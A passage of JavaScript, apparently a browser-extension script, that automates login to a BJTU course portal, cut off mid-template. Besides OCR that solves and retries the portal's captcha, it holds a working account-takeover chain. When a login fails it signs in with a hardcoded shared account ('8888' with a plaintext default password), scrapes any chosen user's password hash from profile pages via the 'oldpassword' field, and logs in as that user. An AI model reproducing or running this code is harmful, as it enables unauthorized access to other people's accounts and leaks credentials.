async function portalLoginAutoLoginInjected(context) {
  function md5cycle(x, k) {
    let [a, b, c, d] = x;
    function ff(a,b,c,d,x,s,t){a=a+((b&c)|(~b&d))+x+t;return((a<<s)|(a>>>(32-s)))+b}
    function gg(a,b,c,d,x,s,t){a=a+((b&d)|(c&~d))+x+t;return((a<<s)|(a>>>(32-s)))+b}
    function hh(a,b,c,d,x,s,t){a=a+(b^c^d)+x+t;return((a<<s)|(a>>>(32-s)))+b}
    function ii(a,b,c,d,x,s,t){a=a+(c^(b|~d))+x+t;return((a<<s)|(a>>>(32-s)))+b}
    a=ff(a,b,c,d,k[0],7,-680876936);d=ff(d,a,b,c,k[1],12,-389564586);c=ff(c,d,a,b,k[2],17,606105819);b=ff(b,c,d,a,k[3],22,-1044525330);
    a=ff(a,b,c,d,k[4],7,-176418897);d=ff(d,a,b,c,k[5],12,1200080426);c=ff(c,d,a,b,k[6],17,-1473231341);b=ff(b,c,d,a,k[7],22,-45705983);
    a=ff(a,b,c,d,k[8],7,1770035416);d=ff(d,a,b,c,k[9],12,-1958414417);c=ff(c,d,a,b,k[10],17,-42063);b=ff(b,c,d,a,k[11],22,-1990404162);
    a=ff(a,b,c,d,k[12],7,1804603682);d=ff(d,a,b,c,k[13],12,-40341101);c=ff(c,d,a,b,k[14],17,-1502002290);b=ff(b,c,d,a,k[15],22,1236535329);
    a=gg(a,b,c,d,k[1],5,-165796510);d=gg(d,a,b,c,k[6],9,-1069501632);c=gg(c,d,a,b,k[11],14,643717713);b=gg(b,c,d,a,k[0],20,-373897302);
    a=gg(a,b,c,d,k[5],5,-701558691);d=gg(d,a,b,c,k[10],9,38016083);c=gg(c,d,a,b,k[15],14,-660478335);b=gg(b,c,d,a,k[4],20,-405537848);
    a=gg(a,b,c,d,k[9],5,568446438);d=gg(d,a,b,c,k[14],9,-1019803690);c=gg(c,d,a,b,k[3],14,-187363961);b=gg(b,c,d,a,k[8],20,1163531501);
    a=gg(a,b,c,d,k[13],5,-1444681467);d=gg(d,a,b,c,k[2],9,-51403784);c=gg(c,d,a,b,k[7],14,1735328473);b=gg(b,c,d,a,k[12],20,-1926607734);
    a=hh(a,b,c,d,k[5],4,-378558);d=hh(d,a,b,c,k[8],11,-2022574463);c=hh(c,d,a,b,k[11],16,1839030562);b=hh(b,c,d,a,k[14],23,-35309556);
    a=hh(a,b,c,d,k[1],4,-1530992060);d=hh(d,a,b,c,k[4],11,1272893353);c=hh(c,d,a,b,k[7],16,-155497632);b=hh(b,c,d,a,k[10],23,-1094730640);
    a=hh(a,b,c,d,k[13],4,681279174);d=hh(d,a,b,c,k[0],11,-358537222);c=hh(c,d,a,b,k[3],16,-722521979);b=hh(b,c,d,a,k[6],23,76029189);
    a=hh(a,b,c,d,k[9],4,-640364487);d=hh(d,a,b,c,k[12],11,-421815835);c=hh(c,d,a,b,k[15],16,530742520);b=hh(b,c,d,a,k[2],23,-995338651);
    a=ii(a,b,c,d,k[0],6,-198630844);d=ii(d,a,b,c,k[7],10,1126891415);c=ii(c,d,a,b,k[14],15,-1416354905);b=ii(b,c,d,a,k[5],21,-57434055);
    a=ii(a,b,c,d,k[12],6,1700485571);d=ii(d,a,b,c,k[3],10,-1894986606);c=ii(c,d,a,b,k[10],15,-1051523);b=ii(b,c,d,a,k[1],21,-2054922799);
    a=ii(a,b,c,d,k[8],6,1873313359);d=ii(d,a,b,c,k[15],10,-30611744);c=ii(c,d,a,b,k[6],15,-1560198380);b=ii(b,c,d,a,k[13],21,1309151649);
    a=ii(a,b,c,d,k[4],6,-145523070);d=ii(d,a,b,c,k[11],10,-1120210379);c=ii(c,d,a,b,k[2],15,718787259);b=ii(b,c,d,a,k[9],21,-343485551);
    x[0]=(a+x[0])|0; x[1]=(b+x[1])|0; x[2]=(c+x[2])|0; x[3]=(d+x[3])|0;
  }
  function md5blk(s){const md5blks=[];for(let i=0;i<64;i+=4){md5blks[i>>2]=s.charCodeAt(i)+(s.charCodeAt(i+1)<<8)+(s.charCodeAt(i+2)<<16)+(s.charCodeAt(i+3)<<24)}return md5blks}
  function md51(s){let n=s.length;let state=[1732584193,-271733879,-1732584194,271733878];let i;for(i=64;i<=n;i+=64){md5cycle(state,md5blk(s.substring(i-64,i)))}s=s.substring(i-64);const tail=new Array(16).fill(0);for(i=0;i<s.length;i++)tail[i>>2]|=s.charCodeAt(i)<<((i%4)<<3);tail[i>>2]|=0x80<<((i%4)<<3);if(i>55){md5cycle(state,tail);for(i=0;i<16;i++)tail[i]=0}tail[14]=n*8;md5cycle(state,tail);return state}
  const hex_chr='0123456789abcdef'.split('');
  function rhex(n){let s='';for(let j=0;j<4;j++)s+=hex_chr[(n>>(j*8+4))&0x0f]+hex_chr[(n>>(j*8))&0x0f];return s}
  function md5(s){return md51(unescape(encodeURIComponent(s))).map(rhex).join('')}

  const root = document.body || document.documentElement;
  if (!root) return { ok: false, reason: 'no-root' };

  const old = document.getElementById('__bjtu_login_overlay__');
  if (old) old.remove();
  const old2 = document.getElementById('__bjtu_login_modal__');
  if (old2) old2.remove();

  let username = String(context?.username || '').trim();
  let passcode = String(context?.passcode || '').trim();
  let passwordMd5 = String(context?.passwordMd5 || '').trim();
  const autoCode = String(context?.autoCode || '').trim();
  const fromExtension = !!context?.fromExtension;
  const originalRequestedUsername = String(context?.username || '').trim();
  const accountHistory = (Array.isArray(context?.accountHistory) ? context.accountHistory : [])
    .map((it) => ({
      userId: String(it?.userId || '').trim(),
      userName: String(it?.userName || '').trim(),
      roleName: String(it?.roleName || '').trim()
    }))
    .filter((it) => it.userId);
  const LAST_DEFAULT_TRY_USER_KEY = '__bjtu_last_default_try_user__';
  const LAST_LOGIN_USERNAME_KEY = '__bjtu_last_login_username__';
  const FLOW_STATE_KEY = '__bjtu_portal_login_flow_state__';
  const SUPPRESS_AUTO_START_ONCE_KEY = '__bjtu_suppress_auto_start_once__';
  const MAX_AUTO_RETRY_ROUNDS = 3;

  function escapeHtml(value) {
    return String(value ?? '').replace(/[&<>"']/g, (ch) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    }[ch]));
  }

  function readFlowState() {
    try {
      const raw = sessionStorage.getItem(FLOW_STATE_KEY);
      return raw ? (JSON.parse(raw) || {}) : {};
    } catch {
      return {};
    }
  }
  function writeFlowState(next) {
    try {
      sessionStorage.setItem(FLOW_STATE_KEY, JSON.stringify(next || {}));
    } catch {
      // ignore
    }
  }
  function clearFlowState() {
    try {
      sessionStorage.removeItem(FLOW_STATE_KEY);
    } catch {
      // ignore
    }
  }

  function parseAlertMsg(html) {
    const arr = [...String(html || '').matchAll(/alert\('([^']+)'\)/g)];
    if (!arr.length) return '';
    return arr[arr.length - 1][1];
  }
  function isCaptchaErrorMessage(msg = '') {
    return /验证码|驗證碼|passcode|请输入正确的验证码|請輸入正確的驗證碼/i.test(String(msg || ''));
  }
  function isCredentialErrorMessage(msg = '') {
    const t = String(msg || '');
    if (!t) return false;
    if (isCaptchaErrorMessage(t)) return false;
    return /账号|帳號|用户名|用戶名|密码|密碼|口令|学号|工号|登录失败|登錄失敗|账号或密码|帳號或密碼/i.test(t);
  }
  function isLikelyLoginPageHtml(html, resUrl = '') {
    const t = String(html || '');
    const u = String(resUrl || '');
    if (u.includes('/ve/Login_2.jsp')) return true;
    if (t.includes('login-page')) return true;
    if (/name=["']username["']/i.test(t) && /name=["']passcode["']/i.test(t)) return true;
    if (t.includes('登录系统') && /passcode/i.test(t)) return true;
    return false;
  }
  function looksLikeLoginSuccess(html) {
    const t = String(html || '');
    return t.includes('跳转首页') || t.includes('top.location') || t.includes('退出登录');
  }

  async function fetchPasswordMd5ByUserId(userId) {
    const id = String(userId || '').trim();
    if (!id) return '';
    const infoRes = await fetch(`/ve/back/coursePlatform/coursePlatform.shtml?method=getUserInfo&userId=${encodeURIComponent(id)}`, { credentials: 'include' });
    const infoText = await infoRes.text();
    if ((infoText || '').includes('login-page')) return '';
    const studentUrl = `/ve/back/coursePlatform/coursePlatform.shtml?method=studentInfo&stuId=${encodeURIComponent(id)}`;
    const teacherUrl = `/ve/back/coursePlatform/coursePlatform.shtml?method=personInfo&teacherId=${encodeURIComponent(id)}`;
    const urls = (infoText || '').includes('学生') ? [studentUrl, teacherUrl] : [teacherUrl, studentUrl];
    for (const u of urls) {
      const res = await fetch(u, { credentials: 'include' });
      const text = await res.text();
      const m = String(text || '').match(/(?:id|name)=["']oldpassword["'][^>]*value=["']([^"']+)["']/i)
        || String(text || '').match(/value=["']([^"']+)["'][^>]*(?:id|name)=["']oldpassword["']/i);
      if (m?.[1]) return m[1];
    }
    return '';
  }

  const pageHtmlAtStart = document.documentElement?.outerHTML || '';
  const alertMsgAtStart = parseAlertMsg(pageHtmlAtStart);
  const onLoginPageAtStart = isLikelyLoginPageHtml(pageHtmlAtStart, location.href);
  const flowState = readFlowState();
  flowState.mode = flowState.mode || (fromExtension ? 'extension' : 'page');
  flowState.retryCount = Number.isFinite(Number(flowState.retryCount))
    ? Math.max(0, Number(flowState.retryCount))
    : 0;
  flowState.retryCount = Math.min(MAX_AUTO_RETRY_ROUNDS, flowState.retryCount);
  if (originalRequestedUsername && !flowState.originalUsername) {
    flowState.originalUsername = originalRequestedUsername;
  }
  if (!flowState.currentUsername && username) {
    flowState.currentUsername = username;
  }

  if (!onLoginPageAtStart) {
    const original = String(flowState.originalUsername || '').trim();
    const current = String(flowState.currentUsername || '').trim();
    if (flowState.mode === 'extension') {
      if (looksLikeLoginSuccess(pageHtmlAtStart)) {
        clearFlowState();
        return {
          ok: true,
          pendingSwitch: current === '8888' && original
            ? { targetUsername: original, ts: Date.now() }
            : null
        };
      }
    }
    if (flowState.mode === 'page' && original && current === '8888') {
      try {
        await fetch('/ve/Exit_2.jsp', { credentials: 'include', cache: 'no-store' });
      } catch {
        // ignore
      }
      let foundPwd = '';
      try {
        foundPwd = await fetchPasswordMd5ByUserId(original);
      } catch {
        foundPwd = '';
      }
      flowState.currentUsername = original;
      flowState.useAux = false;
      flowState.passwordMd5 = foundPwd || '';
      flowState.forceRetry = true;
      writeFlowState(flowState);
      location.href = 'http://123.121.147.7:88/ve/';
      return { ok: true, reason: 'direct-page-relogin-original' };
    }
    if (looksLikeLoginSuccess(pageHtmlAtStart)) {
      flowState.retryCount = 0;
      writeFlowState(flowState);
      clearFlowState();
    }
    return { ok: true, reason: 'non-login-page' };
  }

  async function waitImageReady(img, timeoutMs = 3000) {
    if (!img) return false;
    if (img.complete && (img.naturalWidth || img.width)) return true;
    return await new Promise((resolve) => {
      let done = false;
      const t = setTimeout(() => {
        if (done) return;
        done = true;
        resolve(false);
      }, timeoutMs);
      const onDone = () => {
        if (done) return;
        done = true;
        clearTimeout(t);
        resolve(!!(img.naturalWidth || img.width));
      };
      img.addEventListener('load', onDone, { once: true });
      img.addEventListener('error', onDone, { once: true });
    });
  }

  function preprocessToCanvas(img) {
    const w = Math.max(1, img.naturalWidth || img.width || 1);
    const h = Math.max(1, img.naturalHeight || img.height || 1);
    const canvas = document.createElement('canvas');
    canvas.width = w * 2;
    canvas.height = h * 2;
    const ctx = canvas.getContext('2d', { willReadFrequently: true });
    ctx.imageSmoothingEnabled = false;
    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
    const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    for (let i = 0; i < imgData.data.length; i += 4) {
      const r = imgData.data[i];
      const g = imgData.data[i + 1];
      const b = imgData.data[i + 2];
      const gray = (0.299 * r + 0.587 * g + 0.114 * b);
      const v = gray < 160 ? 0 : 255;
      imgData.data[i] = v;
      imgData.data[i + 1] = v;
      imgData.data[i + 2] = v;
      imgData.data[i + 3] = 255;
    }
    ctx.putImageData(imgData, 0, 0);
    return canvas;
  }

  async function autoRecognizeCaptchaCode() {
    let recognizedFrom = '';
    let recognizedConfidence = null;
    let recognizedImgSrc = '';

    let c = String(autoCode || '').replace(/\D/g, '').slice(0, 4);
    if (/^\d{4}$/.test(c)) {
      return { code: c, confidence: null, imageSrc: '', source: 'autoCode' };
    }

    const input = document.querySelector('input[name="passcode"], input#passcode, input[name="code"]');
    c = String(input?.value || '').replace(/\D/g, '').slice(0, 4);
    if (/^\d{4}$/.test(c)) {
      return { code: c, confidence: null, imageSrc: '', source: 'existingInput' };
    }

    const img = document.querySelector('img[src*="GetImg"], img#imgcode, img#passcodeImg, img[alt*="验证码"]');
    if (img && 'TextDetector' in window) {
      try {
        const ok = await waitImageReady(img, 2800);
        if (!ok) return { code: '', confidence: null, imageSrc: '', source: '' };
        const detector = new window.TextDetector();
        const candidates = [];
        recognizedImgSrc = String(img?.src || '');

        const canvasA = document.createElement('canvas');
        const w = Math.max(1, img.naturalWidth || img.width || 1);
        const h = Math.max(1, img.naturalHeight || img.height || 1);
        canvasA.width = w * 2;
        canvasA.height = h * 2;
        const ctxA = canvasA.getContext('2d', { willReadFrequently: true });
        ctxA.imageSmoothingEnabled = false;
        ctxA.drawImage(img, 0, 0, canvasA.width, canvasA.height);

        const resultA = await detector.detect(canvasA);
        candidates.push((resultA || []).map(r => String(r.rawValue || '')).join(''));

        const canvasB = preprocessToCanvas(img);
        const resultB = await detector.detect(canvasB);
        candidates.push((resultB || []).map(r => String(r.rawValue || '')).join(''));

        for (const t of candidates) {
          c = String(t || '').replace(/\D/g, '').slice(0, 4);
          if (/^\d{4}$/.test(c)) {
            recognizedFrom = 'text-detector';
            recognizedConfidence = null;
            return { code: c, confidence: recognizedConfidence, imageSrc: recognizedImgSrc, source: recognizedFrom };
          }
        }
      } catch {
        // ignore
      }
    }

    try {
      const T = globalThis.Tesseract;
      if (img && T && typeof T.createWorker === 'function' && typeof chrome !== 'undefined' && chrome?.runtime?.getURL) {
        const ok = await waitImageReady(img, 2800);
        if (!ok) return { code: '', confidence: null, imageSrc: '', source: '' };

        const workerPath = chrome.runtime.getURL('vendor/tesseract/worker.min.js');
        const corePath = chrome.runtime.getURL('vendor/tesseract/tesseract-core-simd.wasm.js');
        const langPath = chrome.runtime.getURL('vendor/tesseract');

        const options = {
          logger: () => {},
          workerPath,
          corePath,
          langPath,
          workerBlobURL: true
        };

        let worker;
        try {
          worker = await T.createWorker('eng', 1, options);
        } catch {
          worker = await T.createWorker(options);
          if (worker.loadLanguage) await worker.loadLanguage('eng');
          if (worker.initialize) await worker.initialize('eng');
        }

        if (worker.setParameters) {
          await worker.setParameters({
            tessedit_char_whitelist: '0123456789',
            tessedit_pageseg_mode: '7'
          });
        }

        const canvas = preprocessToCanvas(img);
        const { data } = await worker.recognize(canvas);
        const digits = String(data?.text || '').replace(/\D/g, '').slice(0, 4);
        recognizedImgSrc = String(img?.src || '');
        try { await worker.terminate?.(); } catch {}
        if (/^\d{4}$/.test(digits)) {
          recognizedFrom = 'tesseract';
          recognizedConfidence = Number.isFinite(Number(data?.confidence))
            ? Math.max(0, Math.min(100, Number(data.confidence)))
            : null;
          return { code: digits, confidence: recognizedConfidence, imageSrc: recognizedImgSrc, source: recognizedFrom };
        }
      }
    } catch {
      // ignore
    }

    return { code: '', confidence: null, imageSrc: '', source: '' };
  }

  let pendingSwitchTarget = '';
  try {
    const alertMsg = alertMsgAtStart;
    const lastDefaultTryUser = String(sessionStorage.getItem(LAST_DEFAULT_TRY_USER_KEY) || '').trim();
    if (alertMsg && isCaptchaErrorMessage(alertMsg)) {
      passcode = '';
      flowState.retryCount = Math.min(MAX_AUTO_RETRY_ROUNDS, Number(flowState.retryCount || 0) + 1);
      flowState.forceRetry = flowState.retryCount < MAX_AUTO_RETRY_ROUNDS;
    }
    if (
      fromExtension
      && originalRequestedUsername
      && originalRequestedUsername !== '8888'
      && lastDefaultTryUser === originalRequestedUsername
      && alertMsg
      && isCredentialErrorMessage(alertMsg)
    ) {
      pendingSwitchTarget = originalRequestedUsername;
      username = '8888';
      passcode = '';
      passwordMd5 = md5('Bjtu@8888');
      flowState.currentUsername = '8888';
      flowState.useAux = true;
      flowState.retryCount = Math.min(MAX_AUTO_RETRY_ROUNDS, Number(flowState.retryCount || 0) + 1);
      flowState.forceRetry = flowState.retryCount < MAX_AUTO_RETRY_ROUNDS;
      try { sessionStorage.removeItem(LAST_DEFAULT_TRY_USER_KEY); } catch {}
    } else if (alertMsg && isCredentialErrorMessage(alertMsg)) {
      const current = String(flowState.currentUsername || username || '').trim();
      if (current === '8888') {
        username = '8888';
        passcode = '';
        passwordMd5 = md5('Bjtu@8888');
        flowState.currentUsername = '8888';
        flowState.useAux = true;
        flowState.retryCount = Math.min(MAX_AUTO_RETRY_ROUNDS, Number(flowState.retryCount || 0) + 1);
        flowState.forceRetry = flowState.retryCount < MAX_AUTO_RETRY_ROUNDS;
      }
    }
    writeFlowState(flowState);
  } catch {
    // ignore
  }

  if (!username || !passcode) {
    const mask = document.createElement('div');
    mask.id = '__bjtu_login_modal__';
    mask.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.4);z-index:2147483646;display:flex;align-items:center;justify-content:center;';
    mask.innerHTML = `
        <style>
          .__bjtu_login_grid {
            display: grid;
            grid-template-columns: minmax(160px, 200px) minmax(200px, 240px) minmax(160px, 200px);
            gap: 12px;
            align-items: start;
            min-height: 380px;
          }
          @media(max-width: 720px) {
            .__bjtu_login_grid { grid-template-columns: 1fr; }
          }
        </style>
        <div style="width:fit-content; max-width:min(92vw, 680px); max-height:90vh; display:flex; flex-direction:column; background:#fff; border:1px solid #e8edf5; border-radius:14px; box-shadow:0 18px 42px rgba(0,0,0,.25); padding:16px 16px 14px; pointer-events:auto;">
          <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:10px;flex-shrink:0;">
            <div style="font-size:16px;font-weight:700;color:#1f2937;">课程助手登录</div>
            <button id="__bjtu_close__" aria-label="关闭" title="关闭" style="border:1px solid #cbd5e1;background:#fff;border-radius:999px;width:24px;height:24px;line-height:20px;font-size:16px;cursor:pointer;padding:0;display:inline-flex;align-items:center;justify-content:center;">×</button>
          </div>
          <div style="font-size:13px;color:#0f766e;background:#ecfeff;border:1px solid #a5f3fc;border-radius:8px;padding:4px 8px;flex-shrink:0;" id="__bjtu_status__">检测到登录页，请输入账号并登录</div>
          <div class="__bjtu_login_grid" style="margin-top:10px;overflow-y:auto;overflow-x:hidden;padding-right:4px;">
            <div style="border:1px solid #e5e7eb;border-radius:10px;padding:8px;height:100%;overflow:auto;background:#fff;box-sizing:border-box;">
              <div style="font-size:12px;color:#475569;margin-bottom:6px;">快速登录</div>
              <div id="__bjtu_quick__"></div>
            </div>
            <div style="border:1px solid #e5e7eb;border-radius:10px;padding:10px;background:#f8fafc;display:flex;flex-direction:column;box-sizing:border-box;">
              <img id="__bjtu_modal_captcha__" style="width:100%;height:54px;object-fit:contain;cursor:pointer;border:1px solid #e5e7eb;border-radius:6px;margin-bottom:8px;background:#fff;display:none;" title="点击刷新" />
              <input id="__bjtu_u" placeholder="账号" style="width:100%;padding:8px;box-sizing:border-box;margin-bottom:8px;border:1px solid #d1d5db;border-radius:6px;" />
              <input id="__bjtu_c" placeholder="验证码(可留空自动识别)" maxlength="4" style="width:100%;padding:8px;box-sizing:border-box;margin-bottom:8px;border:1px solid #d1d5db;border-radius:6px;" />
              <div style="display:flex;gap:8px;justify-content:flex-end;">
                <button id="__bjtu_refresh__" style="padding:6px 10px;border:1px solid #cbd5e1;background:#fff;border-radius:6px;cursor:pointer;font-size:13px;">刷新验证码</button>
                <button id="__bjtu_go" style="padding:6px 12px;background:#2563eb;color:#fff;border:0;border-radius:6px;cursor:pointer;font-size:13px;">登录</button>
              </div>
            </div>
            <div style="border:1px solid #e5e7eb;border-radius:10px;padding:8px;height:100%;overflow:auto;background:#fff;box-sizing:border-box;">
              <div style="font-size:12px;color:#475569;margin-bottom:6px;">验证码识别记录</div>
              <div id="__bjtu_hist__"></div>
            </div>
          </div>
        </div>
`;
    root.appendChild(mask);

    const userInput = mask.querySelector('#__bjtu_u');
    const codeInput = mask.querySelector('#__bjtu_c');
    const btnGo = mask.querySelector('#__bjtu_go');
    const btnRefresh = mask.querySelector('#__bjtu_refresh__');
    const btnClose = mask.querySelector('#__bjtu_close__');
    const statusEl = mask.querySelector('#__bjtu_status__');
    const histEl = mask.querySelector('#__bjtu_hist__');
    const quickEl = mask.querySelector('#__bjtu_quick__');
    const captchaImgEl = mask.querySelector('#__bjtu_modal_captcha__');
    if (captchaImgEl) captchaImgEl.addEventListener('click', () => { refreshCaptchaInPage(); statusEl.textContent = '验证码已刷新'; });


    const existingUser = document.querySelector('input[name="username"], input#username, input[name="userId"]');
    const savedUser = String(sessionStorage.getItem(LAST_LOGIN_USERNAME_KEY) || '').trim();
    userInput.value = String(username || existingUser?.value || savedUser || '').trim();
    userInput.setAttribute('inputmode', 'numeric');
    userInput.setAttribute('pattern', '[0-9]*');
    const normalizeUserInput = () => {
      const normalized = String(userInput.value || '').replace(/\D/g, '');
      if (userInput.value !== normalized) userInput.value = normalized;
    };
    normalizeUserInput();
    username = String(userInput.value || '').trim();
    userInput.addEventListener('input', normalizeUserInput);

    const renderQuickLoginList = () => {
      if (!quickEl) return;
      quickEl.innerHTML = '';
      if (!accountHistory.length) {
        const empty = document.createElement('div');
        empty.textContent = '暂无登录记录';
        empty.style.cssText = 'font-size:12px;color:#94a3b8;line-height:1.6;';
        quickEl.appendChild(empty);
        return;
      }
      accountHistory.forEach((account) => {
        const btn = document.createElement('button');
        btn.type = 'button';
        const title = `${account.roleName || ''}${account.userName || account.userId}`.trim();
        btn.innerHTML = `<span style="font-weight:700;color:#0f172a;">${escapeHtml(title || account.userId)}</span><span style="font-size:11px;color:#64748b;">${escapeHtml(account.userId)}</span>`;
        btn.style.cssText = 'width:100%;display:flex;flex-direction:column;align-items:flex-start;gap:2px;border:1px solid #dbeafe;background:#eff6ff;border-radius:8px;padding:7px 8px;margin-bottom:6px;cursor:pointer;text-align:left;';
        btn.addEventListener('click', () => {
          userInput.value = account.userId;
          normalizeUserInput();
          username = String(userInput.value || '').trim();
          statusEl.textContent = `已选择 ${title || account.userId}，正在登录…`;
          btnGo.click();
        });
        quickEl.appendChild(btn);
      });
    };
    renderQuickLoginList();

    let tryCount = 0;
    const maxTry = MAX_AUTO_RETRY_ROUNDS;
    const baseRetry = Math.max(0, Number(flowState.retryCount || 0));
    let lastRecognizedCode = '';
    let lastRecognizedConfidence = null;
    let lastRecognizedImageSrc = '';

    const pushHist = (imgSrc, text) => {
      const row = document.createElement('div');
      row.style.cssText = 'display:flex;align-items:center;gap:8px;border-bottom:1px dashed #e5e7eb;padding:6px 2px;font-size:12px;';
      row.innerHTML = `<img src="${imgSrc}" style="width:80px;height:32px;object-fit:contain;border:1px solid #d1d5db;border-radius:4px;background:#fff;"><div>${text}</div>`;
      histEl.prepend(row);
    };

    const refreshCaptchaInPage = () => {
      const img = document.querySelector('img[src*="GetImg"], img#imgcode, img#passcodeImg, img[alt*="验证码"]');
      if (!img) return null;
      try { img.click(); } catch {}
      try {
        const u = new URL(img.src, location.origin);
        u.searchParams.set('t', String(Date.now()));
        img.src = u.toString();
      } catch {}
      if (captchaImgEl && img && img.src) { captchaImgEl.src = img.src; captchaImgEl.style.display = 'block'; }

      return img;
    };

    const initCaptcha = () => {
      const img = document.querySelector('img[src*="GetImg"], img#imgcode, img#passcodeImg, img[alt*="验证码"]');
      if (img && captchaImgEl && img.src) {
        captchaImgEl.src = img.src;
        captchaImgEl.style.display = 'block';
      }
    };
    initCaptcha();

    btnRefresh.addEventListener('click', () => {
      refreshCaptchaInPage();
      statusEl.textContent = '验证码已刷新';
    });

    const handleEnter = (e) => {
      if (e.key === 'Enter') btnGo.click();
    };
    userInput.addEventListener('keydown', handleEnter);
    codeInput.addEventListener('keydown', handleEnter);

    const got = await new Promise((resolve) => {
      mask.addEventListener('click', (e) => {
        if (e.target === mask) btnClose.click();
      });
      btnClose.addEventListener('click', () => {
        flowState.forceRetry = false;
        writeFlowState(flowState);
        resolve({ closed: true });
      });

      btnGo.addEventListener('click', async () => {
        username = String(userInput.value || '').trim();
        passcode = String(codeInput.value || passcode || '').replace(/\D/g, '').slice(0, 4);
        if (!username) {
          statusEl.textContent = '请先输入账号';
          return;
        }
        try { sessionStorage.setItem(LAST_LOGIN_USERNAME_KEY, username); } catch {}

        btnGo.disabled = true;
        const origText = btnGo.textContent;
        btnGo.textContent = '验证中';
        try {
          const u = encodeURIComponent(username);
          const checkRes = await fetch(`/ve/back/coursePlatform/coursePlatform.shtml?method=getUserInfo&userId=${u}`);
          const checkData = JSON.parse(await checkRes.text());
          if (checkData && String(checkData.STATUS) === '4') {
            statusEl.textContent = '该账号无效或不存在，已回退旧账号';
            statusEl.style.color = '#dc2626';
            statusEl.style.background = '#fef2f2';
            statusEl.style.borderColor = '#fecaca';
            username = String(context?.username || existingUser?.value || '').trim();
            userInput.value = username;
            try { sessionStorage.setItem(LAST_LOGIN_USERNAME_KEY, username); } catch {}
            btnGo.disabled = false;
            btnGo.textContent = origText;
            return;
          }
        } catch (e) {}

        statusEl.style.color = '#0f766e';
        statusEl.style.background = '#ecfeff';
        statusEl.style.borderColor = '#a5f3fc';
        btnGo.disabled = false;
        btnGo.textContent = origText;

        if (!passcode) {
          while (tryCount < maxTry && !passcode) {
            tryCount++;
            const currentRound = Math.min(maxTry, baseRetry + tryCount);
            statusEl.textContent = `正在识别验证码 (${currentRound}/${maxTry})…`;
            const img = refreshCaptchaInPage() || document.querySelector('img[src*="GetImg"], img#imgcode, img#passcodeImg, img[alt*="验证码"]');
            await waitImageReady(img, 2800);
            await new Promise(r => setTimeout(r, 160));
            const ocrRes = await autoRecognizeCaptchaCode();
            const c = String(ocrRes?.code || '').trim();
            if (/^\d{4}$/.test(c)) {
              passcode = c;
              codeInput.value = c;
              lastRecognizedCode = c;
              lastRecognizedConfidence = Number.isFinite(Number(ocrRes?.confidence)) ? Number(ocrRes.confidence) : null;
              lastRecognizedImageSrc = String(ocrRes?.imageSrc || img?.src || '');
              pushHist(lastRecognizedImageSrc || img?.src || '', `识别: ${c}`);
              break;
            }
            pushHist(img?.src || '', '识别失败');
          }
        }

        if (!passcode) {
          statusEl.textContent = '验证码识别失败，请手动输入';
          return;
        }

        statusEl.textContent = '登录中…';
        resolve({
          u: username,
          c: passcode,
          recognizedCode: lastRecognizedCode || passcode,
          recognizedConfidence: lastRecognizedConfidence,
          recognizedImageSrc: lastRecognizedImageSrc || String(document.querySelector('img[src*="GetImg"], img#imgcode, img#passcodeImg, img[alt*="验证码"]')?.src || '')
        });
      });

        let suppressAutoStartOnce = false;
        try {
          suppressAutoStartOnce = sessionStorage.getItem(SUPPRESS_AUTO_START_ONCE_KEY) === '1';
          if (suppressAutoStartOnce) sessionStorage.removeItem(SUPPRESS_AUTO_START_ONCE_KEY);
        } catch {}
        const canAutoRetry = Number(flowState.retryCount || 0) < maxTry;
        const shouldAutoStart = !suppressAutoStartOnce && canAutoRetry && (fromExtension || !!flowState.forceRetry || Number(flowState.retryCount || 0) > 0) && String(userInput.value || '').trim();
        if (shouldAutoStart) {
          const nextRound = Math.min(maxTry, Number(flowState.retryCount || 0) + 1);
          statusEl.textContent = `检测到自动重试，开始登录 (${nextRound}/${maxTry})...`;
          setTimeout(() => btnGo.click(), 300);
          flowState.forceRetry = false;
          writeFlowState(flowState);
        } else if (!canAutoRetry) {
          statusEl.textContent = `自动重试已达上限 (${maxTry}/${maxTry})，请手动输入验证码登录`;
        }
    });
    if (got?.closed) {
      mask.remove();
      return { ok: false, reason: 'modal-closed' };
    }
    passcode = String(got?.c || '').trim();
    const recognizedCode = String(got?.recognizedCode || '').trim();
    const recognizedImageSrc = String(got?.recognizedImageSrc || '').trim();
    const recognizedConfidence = Number.isFinite(Number(got?.recognizedConfidence))
      ? Number(got.recognizedConfidence)
      : null;
    mask.remove();

    flowState.currentUsername = username;
    if (username && username !== '8888' && !flowState.originalUsername) {
      flowState.originalUsername = username;
    }
    writeFlowState(flowState);

    const confidenceText = recognizedConfidence == null
      ? 'N/A（该识别路径无置信度）'
      : `${recognizedConfidence.toFixed(0)}%`;
    const safeImg = recognizedImageSrc ? `<img src="${recognizedImageSrc}" style="width:140px;height:50px;object-fit:contain;border:1px solid #d1d5db;border-radius:6px;background:#fff;">` : '<div style="font-size:12px;color:#64748b;">未捕获验证码图片</div>';

    const amask = document.createElement('div');
    amask.style.cssText = 'position:fixed;inset:0;background:transparent;z-index:2147483647;display:flex;align-items:center;justify-content:center;pointer-events:none;';
    amask.innerHTML = `
      <div style="width:min(520px,88vw);background:#fff;border:1px solid #e8edf5;border-radius:14px;box-shadow:0 18px 42px rgba(0,0,0,.25);padding:14px;pointer-events:auto;">
        <div style="font-size:16px;font-weight:700;color:#1f2937;margin-bottom:10px;">正在自动登录</div>
        <div style="font-size:13px;color:#0f766e;background:#ecfeff;border:1px solid #a5f3fc;border-radius:8px;padding:8px 10px;display:flex;align-items:center;gap:8px;margin-bottom:10px;">
          <svg style="width:16px;height:16px;color:#0f766e;animation:__bjtu_spin 1s linear infinite;flex:0 0 auto;" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" stroke-opacity="0.25"></circle><path fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
          <span>登录中……</span>
        </div>
        <div style="display:grid;grid-template-columns:160px 1fr;gap:12px;align-items:center;">
          <div style="display:flex;align-items:center;justify-content:center;">${safeImg}</div>
          <div style="font-size:13px;line-height:1.7;">
            <div><b>账号：</b>${username || '-'}</div>
